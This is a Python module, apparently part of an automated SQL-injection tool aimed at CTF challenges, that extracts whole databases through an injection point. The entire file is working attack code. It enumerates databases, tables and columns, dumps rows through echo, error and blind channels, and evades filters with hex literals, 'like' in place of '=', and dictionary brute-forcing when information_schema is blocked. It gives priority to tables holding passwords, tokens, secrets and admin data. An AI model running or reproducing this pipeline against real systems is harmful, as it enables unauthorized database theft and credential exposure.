"""数据提取流水线：库 → 表 → 列 → 数据（全自动脱库）。

- 优先 group_concat 一次取全（回显/报错通道）；
- 盲注通道自动改用 count + limit 逐行；
- 引号被过滤时表名等字符串走十六进制字面量。
"""
from __future__ import annotations

import re
from dataclasses import dataclass, field

from .builder import PayloadBuilder
from .dbms import Dialect, MYSQL, SQLITE, get_dialect, parse_create_table_columns
from .models import WafReport
from .oracles import BaseOracle, BoolOracle, OracleError, TimeOracle
from .session import HttpSession

INTERESTING = re.compile(r"flag|user|admin|secret|key|pass|token|config", re.I)
FLAGISH = re.compile(r"ctfshow\{|flag\{", re.I)   # flag 样式内容（非表列名）

# 盲注通道 flag 优先探测：like 'ctfshow{%' / 'flag{%' 的十六进制字面量
# （引号可能被滤，hex 字面量最稳）
_FLAG_LIKE_HEX = ["0x63746673686f777b25", "0x666c61677b25"]

# 系统库不参与业务脱库
SYSTEM_DBS = {"information_schema", "mysql", "performance_schema", "sys", "test"}

_BRUTE: dict | None = None


def _brute_dict() -> dict:
    """存在性爆破字典（information_schema 被拦时的表名/列名候选）。"""
    global _BRUTE
    if _BRUTE is None:
        import yaml
        from .waf import DICT_DIR
        try:
            with open(DICT_DIR / "bruteforce.yaml", encoding="utf-8") as f:
                _BRUTE = yaml.safe_load(f) or {}
        except OSError:
            _BRUTE = {}
    return _BRUTE


@dataclass
class DumpResult:
    database: str = ""
    version: str = ""
    user: str = ""
    databases: list = field(default_factory=list)
    tables: dict = field(default_factory=dict)          # db -> [tables]
    columns: dict = field(default_factory=dict)         # (db, table) -> [columns]
    rows: dict = field(default_factory=dict)            # (db, table) -> [ {col: val} ]

    def to_dict(self):
        return {
            "database": self.database, "version": self.version, "user": self.user,
            "databases": self.databases,
            "tables": {db: ts for db, ts in self.tables.items()},
            "columns": {f"{db}.{t}": cs for (db, t), cs in self.columns.items()},
            "rows": {f"{db}.{t}": rs for (db, t), rs in self.rows.items()},
        }


class ExtractionPipeline:
    def __init__(self, oracle: BaseOracle, builder: PayloadBuilder,
                 session: HttpSession, waf: WafReport, dialect: Dialect = None):
        self.o = oracle
        self.b = builder
        self.s = session
        self.waf = waf
        self.dialect = dialect or MYSQL
        self.log = session.log


    def _note(self, title: str, note: str = ""):
        """把当前通道最近一条真实 payload 登记为解题步骤。"""
        if getattr(self.o, "last_payload", ""):
            self.s.record_step(title, self.o.last_payload, note)

    def _eq(self, col: str, lit: str) -> str:
        """等值条件。= 被滤（web209 类）或盲注通道（空响应族扫描看不见过滤，
        web217 类 api 实际拦 =）时都用 like 精确匹配——无 % 通配语义等价，
        且 like 极少出现在黑名单里。"""
        if self.waf.is_filtered("=") or self._is_blind():
            return f"{col} like {lit}"
        return f"{col}={lit}"

    def _count(self) -> str:
        """count 聚合：恒用 count(1)——语义等价 count(*)，且不惧 * 被滤
        （web209/214 类：* 在黑名单时 count(*) 整包被拒，探测无从区分）。"""
        return "count(1)"

    # ------------------------------------------------------------------ basic
    def version(self) -> str:
        v = self.o.scalar(self.dialect.version_fn)
        self._note("获取数据库版本", f"版本 = {v}")
        return v

    def current_db(self) -> str:
        if self.dialect.current_db_fn is None:
            return "main"          # SQLite 单库
        d = self.o.scalar(self.dialect.current_db_fn)
        self._note("获取当前数据库名", f"当前库 = {d}")
        return d

    def current_user(self) -> str:
        if self.dialect.user_fn is None:
            return ""
        return self.o.scalar(self.dialect.user_fn)

    # ------------------------------------------------------------------ meta
    def _can_group_concat(self) -> bool:
        return not self.waf.is_filtered("group_concat", "information_schema")

    def _fast_list(self, what: str, where: str) -> list:
        """group_concat 一次取回（快通道）。"""
        raw = self.o.scalar(f"(select group_concat({what}) from {where})")
        return [x for x in raw.split(",") if x]

    def _slow_list(self, what: str, where: str) -> list:
        """count + limit 逐行（盲注通道）。"""
        try:
            count = self.o.scalar_int(f"(select count({what}) from {where})")
        except OracleError:
            return []
        items = []
        for i in range(count):
            if self.s.stopped:
                break
            v = self.o.scalar(f"(select {what} from {where} limit {i},1)")
            if not v:
                break
            items.append(v)
        return items

    def _brute(self, what: str, expr_fmt: str, words: list) -> list:
        """存在性爆破底座：逐词构造「存在→值 0 / 不存在→报错」子查询。
        连续失败（通道失效/大量词被拦）达阈值则中止，避免刷屏。"""
        if not hasattr(self.o, "exists"):
            return []
        found, fail = [], 0
        for w in words:
            if self.s.stopped:
                break
            try:
                if self.o.exists(expr_fmt.format(w=w)):
                    found.append(w)
                    self.log("INFO", f"[脱库] 字典爆破命中{what}: {w}")
                fail = 0
            except OracleError as e:
                fail += 1
                if fail >= 5:
                    self.log("WARN", f"[脱库] {what}名爆破通道连续失效，中止: {str(e)[:60]}")
                    break
        return found

    def list_databases(self) -> list:
        if self.dialect.name == "sqlite":
            return ["main"]
        where = "information_schema.schemata"
        if self._can_group_concat():
            dbs = self._fast_list("schema_name", where)
        else:
            dbs = self._slow_list("schema_name", where)
        return dbs or []

    def list_tables(self, db: str) -> list:
        if self.dialect.name == "sqlite":
            where = "sqlite_master where(type='table')"
            if self._can_group_concat():
                raw = self.o.scalar(
                    f"(select group_concat(name) from {where}"
                    f" and(name not like 'sqlite_%'))")
                self._note("获取全部表名（SQLite）",
                           "SQLite 用 sqlite_master 代替 information_schema")
                return [x for x in raw.split(",") if x] if raw else []
            return self._slow_list("name", where)
        if self.waf.is_filtered("information_schema"):
            # information_schema 含 or 子串等被拦 → 常用表名存在性爆破兜底
            fmt = f"(select(0)from({db}.{{w}}))" if db else "(select(0)from({w}))"
            tables = self._brute("表", fmt, _brute_dict().get("tables", []))
            if tables:
                self._note("字典爆破表名（information_schema 被拦）",
                           f"{db} 的表: {tables}")
            return tables
        lit = self.b.str_lit(db)
        where = ("information_schema.tables where "
                 + self._eq("table_schema", lit))
        if self._can_group_concat():
            tables = self._fast_list("table_name", where)
            self._note("获取表名清单",
                       f"{db} 的表: {tables}")
            return tables
        return self._slow_list("table_name", where)

    def list_columns(self, db: str, table: str) -> list:
        if self.dialect.name == "sqlite":
            # 建表语句解析（sqlite 无 information_schema）
            lit = self.b.str_lit(table)
            ddl = self.o.scalar(self.dialect.get_ddl.format(lit=lit))
            cols = parse_create_table_columns(ddl) if ddl else []
            self.log("INFO", f"[脱库] {table} 的列(SQLite DDL 解析): {cols}")
            return cols
        if self.dialect.name == "mysql" and self.waf.is_filtered("information_schema"):
            # 派生表子查询存在性爆破：列不存在 → SQL 报错；存在 → 值 0
            full = f"{db}.{table}" if db and db != "main" else table
            fmt = f"(select(0)from(select({{w}})from({full}))t)"
            cols = self._brute("列", fmt, _brute_dict().get("columns", []))
            if cols:
                self._note("字典爆破列名（information_schema 被拦）",
                           f"{full} 的列: {cols}")
            return cols
        # 单条件 table_name 最通用：FinalSQL 类强 WAF 拦 and 双条件与 0x hex 字面量
        lit = self.b.str_lit(table)
        where = ("information_schema.columns where "
                  + self._eq("table_name", lit))
        if self._can_group_concat():
            cols = self._fast_list("column_name", where)
            if cols and all(len(c) <= 150 for c in cols):
                return cols
            # group_concat(1024) 截断风险（FinalSQL 类超长 ~ 列名）→ 按列序完整提取
            self.log("INFO", "[脱库] 列名疑似被 group_concat 截断，改用 ordinal_position 逐列提取")
        return self._columns_by_ordinal(db, table)

    def _columns_by_ordinal(self, db: str, table: str) -> list:
        """按 ordinal_position 等值提取（免 limit；需 and 可用，作超长列名 fallback）。"""
        where = f"information_schema.columns where table_name={self.b.str_lit(table)}"
        try:
            count = self.o.scalar_int(f"(select count(1) from {where})")
        except OracleError:
            return []
        cols = []
        for i in range(1, count + 1):
            if self.s.stopped:
                break
            c = self.o.scalar(f"(select column_name from {where} "
                              f"and " + self._eq("ordinal_position", str(i)) + ")")
            if not c:
                break
            cols.append(c)
            self.log("INFO", f"[脱库] 列[{i}]: {(c[:24] + '…') if len(c) > 24 else c}")
        return cols

    # ------------------------------------------------------------------ data
    def _is_blind(self) -> bool:
        return isinstance(self.o, (BoolOracle, TimeOracle))

    def try_flag_first(self, db: str, table: str, columns: list) -> list | None:
        """盲注通道专用捷径：先探「含 flag 的行」，命中则只按行提取，
        避免全表 group_concat 盲拖（web175 类：608 字符 ≈ 4200 请求 → ~50）。
        未命中/构造不可行返回 None，调用方回退常规导出。"""
        if self.waf.is_filtered("like"):
            return None
        comma_ok = not self.waf.is_filtered(",")
        hit_col, n_rows = None, 0
        for col in columns:
            if self.s.stopped:
                return None
            for like_hex in _FLAG_LIKE_HEX:
                try:
                    cnt = self.o.scalar_int(
                        f"(select {self._count()} from {db}.{table} "
                        f"where {col} like {like_hex})")
                except OracleError:
                    continue
                if cnt > 0:
                    hit_col, n_rows = col, min(cnt, 3 if comma_ok else 1)
                    break
            if hit_col:
                break
        if not hit_col:
            return None
        self._note(f"flag 优先提取 {db}.{table}",
                   f"盲注通道命中 like 命中列 {hit_col}（{n_rows} 行），"
                   "跳过全表盲拖")
        rows = []
        for i in range(n_rows):
            lim = f" limit {i},1" if comma_ok and i else " limit 1"
            row = {}
            for c in columns:
                if self.s.stopped:
                    break
                try:
                    row[c] = self.o.scalar(
                        f"(select {c} from {db}.{table} where {hit_col} "
                        f"like {_FLAG_LIKE_HEX[0]}{lim})")
                except OracleError:
                    row[c] = ""
            rows.append(row)
            self.log("DATA", f"[{db}.{table}] "
                             f"{ {k[:16]: v[:60] for k, v in row.items()} }")
        return rows

    def dump_rows(self, db: str, table: str, columns: list,
                  max_rows: int = 20) -> list:
        if self.waf.is_filtered(","):
            # 逗号被拦：concat_ws 多列与 limit 分页均不可构造 → 逐列 group_concat
            # （单列 group_concat 无逗号，配合 arith 括号化无空格）
            return self._dump_rows_percol(db, table, columns, max_rows)
        # limit 依赖空格/tab（严格形态下不可用）→ group_concat 全量导出（紧凑无空格）
        try:
            return self._dump_rows_concatws(db, table, columns, max_rows)
        except OracleError:
            # concat_ws 被拦（ctf.show 类）→ 降级为逐列 group_concat
            self.log("WARN", f"[脱库] concat_ws 通道被拦截，"
                             f"{db}.{table} 降级为逐列提取")
            return self._dump_rows_percol(db, table, columns, max_rows)

    def _dump_rows_concatws(self, db, table, columns, max_rows):
        # 分隔字面量自适应：引号可用走引号，被滤走 hex（FinalSQL 恰好相反：hex 被拦）
        # concat_ws 自身忽略 NULL 参数（免 ifnull——FinalSQL 类 WAF 拦 ifnull）
        sep = self.b.str_lit("~")
        cols_expr = "concat_ws(" + sep + "," + ",".join(columns) + ")"
        raw = self.o.scalar(f"(select group_concat({cols_expr}) from {db}.{table})")
        self._note(f"导出 {db}.{table} 数据", f"group_concat 一次取回全表")
        rows = []
        for chunk in raw.split(",")[:max_rows]:
            parts = chunk.split("~")
            row = {c: (parts[j] if j < len(parts) else "")
                   for j, c in enumerate(columns)}
            rows.append(row)
            self.log("DATA", f"[{db}.{table}] "
                             f"{ {k[:16]: v[:40] for k, v in row.items()} }")
        return rows

    def _dump_rows_percol(self, db, table, columns, max_rows):
        """逐列 group_concat（免 concat_ws；行按逗号拆分对齐）。"""
        col_vals = {}
        for c in columns:
            if self.s.stopped:
                break
            raw = self.o.scalar(f"(select group_concat({c}) from {db}.{table})")
            self._note(f"导出 {db}.{table}.{c} 数据", "逐列 group_concat（concat_ws 被滤时降级）")
            col_vals[c] = raw.split(",") if raw else []
        n = min(max((len(v) for v in col_vals.values()), default=0), max_rows)
        rows = []
        for i in range(n):
            row = {c: (col_vals[c][i] if i < len(col_vals[c]) else "")
                   for c in columns}
            rows.append(row)
            self.log("DATA", f"[{db}.{table}] "
                             f"{ {k[:16]: v[:40] for k, v in row.items()} }")
        return rows

    def table_row_count(self, db: str, table: str) -> int:
        try:
            return self.o.scalar_int(f"(select count(1) from {db}.{table})")
        except OracleError:
            return -1

    # ------------------------------------------------------------------ auto
    def _quick_flag_row(self) -> DumpResult | None:
        """盲注通道专用：跳过库/表/列枚举，直接按常见表名列名找 flag 行。

        盲注通道每取一个字符串都是几十个请求，枚举 information_schema 动辄
        4-5 千请求（web190-192 实测）；CTF 题里 flag 基本落在
        `ctfshow_user.f1ag/flag/pass` 这类位置，逐个 count+like 探测只要几百请求。
        """
        guess_tables = ("ctfshow_user", "ctfshow_flxg", "ctfshow_flag",
                        "ctfshow_fl4g", "flag", "f1ag", "fl4g", "user")
        guess_cols = ("f1ag", "flag", "pass", "password", "username", "fl4g")
        hex_like = "0x63746673686f777b25"      # ctfshow{%
        for t in guess_tables:
            for c in guess_cols:
                if self.s.stopped:
                    return None
                try:
                    cnt = self.o.scalar_int(
                        f"(select {self._count()} from {t} where {c} like {hex_like})")
                except OracleError:
                    continue
                if cnt <= 0:
                    continue
                self.log("INFO", f"[脱库] 盲注快速定位：{t}.{c} 命中 flag 行，直接提取")
                val = self.o.scalar(
                    f"(select {c} from {t} where {c} like {hex_like} limit 1)")
                if not val:
                    continue
                res = DumpResult()
                try:
                    res.database = self.current_db()
                except OracleError:
                    res.database = ""
                res.tables[res.database or ""] = [t]
                res.columns[(res.database or "", t)] = [c]
                res.rows[(res.database or "", t)] = [{c: val}]
                self._note(f"盲注快速提取 {t}.{c}", "跳过 information_schema 枚举")
                return res
        return None

    def auto_dump(self, max_rows: int = 20, dump_all_dbs: bool = False) -> DumpResult:
        res = DumpResult()
        res.version = self.version()
        res.database = self.current_db()
        res.user = self.current_user()
        if self._is_blind():
            quick = self._quick_flag_row()
            if quick is not None:
                quick.version, quick.user = res.version, res.user
                return quick
        self.log("INFO", f"[脱库] version={res.version} db={res.database} user={res.user}")
        # 表名提示（web214 类：debug 回显给出基础查询表）——盲注全库枚举太贵，
        # 先对提示表做 flag 优先探测，命中即收工
        hint = getattr(self.s.spec, "table_hint", "")
        if hint and self._is_blind():
            try:
                cols = self.list_columns(res.database, hint)
            except OracleError:
                cols = []
            if cols:
                rows = self.try_flag_first(res.database, hint, cols)
                if rows:
                    res.tables[res.database] = [hint]
                    res.columns[(res.database, hint)] = cols
                    res.rows[(res.database, hint)] = rows
                    self._note("表名提示直取 flag 行",
                               f"{res.database}.{hint}（跳过全库枚举）")
                    return res
            self.log("INFO", f"[脱库] 表名提示 {hint} 未命中 flag 行，回退全库枚举")

        # 时间盲注通道：全库枚举太贵（库名清单 60 字符 ≈ 5 分钟睡眠），
        # 先只打当前库（CTF 的 flag 几乎总在当前库），找不到再回退全库枚举
        blind = self._is_blind()
        first_pass_only_current = blind and not dump_all_dbs

        def _enumerate_and_dump(full: bool = True):
            if full:
                res.databases = self.list_databases()
                self.log("INFO", f"[脱库] 所有数据库: {res.databases}")
                # 默认覆盖全部用户库（CTF 常见跨库 flag：当前库 geek，flag 在 ctf.Flag）
                targets = res.databases if dump_all_dbs else                     [d for d in res.databases
                     if d.lower() not in SYSTEM_DBS] or [res.database]
            else:
                # 时间盲注首传：只打当前库（flag 几乎总在当前库）
                res.databases = [res.database]
                targets = [res.database]
            for db in targets:
                if self.s.stopped:
                    break
                tables = self.list_tables(db)
                res.tables[db] = tables
                self.log("INFO", f"[脱库] {db} 的表: {tables}")
            # 取全部列结构
            for db, tables in res.tables.items():
                for t in tables:
                    if self.s.stopped:
                        break
                    cols = self.list_columns(db, t)
                    res.columns[(db, t)] = cols
                    self.log("INFO", f"[脱库] {db}.{t} 的列: {cols}")
            # 有干货的表优先（表名或列名命中关键词，如 1919810931114514 藏 flag 列）
            hot = []
            for (db, t), cols in res.columns.items():
                pri = 2 if (INTERESTING.search(t)
                            or any(INTERESTING.search(c) for c in cols)) else 1
                hot.append((pri, db, t))
            hot.sort(reverse=True)
            for pri, db, t in hot:
                if self.s.stopped:
                    break
                cols = res.columns.get((db, t), [])
                if not cols:
                    continue
                # 关键词命中表全量导出；其余用户表也探前 3 行
                n_rows = max_rows if pri == 2 else min(3, max_rows)
                self.log("INFO", f"[脱库] 导出 {db}.{t} 前 {n_rows} 行（列名示例: "
                                 f"{(cols[0][:20] + '…') if len(cols[0]) > 20 else cols[0]}）")
                try:
                    # 盲注通道：先试 flag 优先捷径（全表 group_concat 盲拖代价太高）
                    if self._is_blind():
                        rows = self.try_flag_first(db, t, cols)
                        if rows is not None:
                            res.rows[(db, t)] = rows
                            continue
                    res.rows[(db, t)] = self.dump_rows(db, t, cols, n_rows)
                except OracleError as e:
                    # 单表失败（超长 payload 被拦/敏感词）不阻断其余表
                    self.log("WARN", f"[脱库] {db}.{t} 导出失败（跳过）: {str(e)[:90]}")

        _enumerate_and_dump(full=not first_pass_only_current)
        if first_pass_only_current and not self.s.stopped:
            # 当前库没摸到 flag 样式的行 → 回退全库枚举补一遍
            has_flagish = any(FLAGISH.search(str(v)) for row in res.rows.values()
                              for v in row.values())
            if not has_flagish:
                self.log("INFO", "[脱库] 当前库未见 flag 样式行，回退全库枚举")
                _enumerate_and_dump()
        return res
